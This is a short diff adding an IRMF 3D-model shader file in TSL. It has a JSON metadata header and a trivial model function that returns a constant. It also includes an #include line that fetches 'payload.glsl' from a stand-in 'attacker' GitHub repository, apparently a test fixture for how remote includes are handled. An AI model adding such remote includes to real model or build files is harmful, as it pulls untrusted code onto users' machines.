@@ -1,0 +1,11 @@
+/*{
+  "irmf": "1.0",
+  "language": "tsl",
+  "tslVersion": "0.180.0",
+  "materials": ["PLA"],
+  "min": [-5, -5, -5],
+  "max": [5, 5, 5],
+  "units": "mm"
+}*/
+#include "github.com/attacker/repo/blob/main/payload.glsl"
+const mainModel4 = (xyz) => [float(1)];
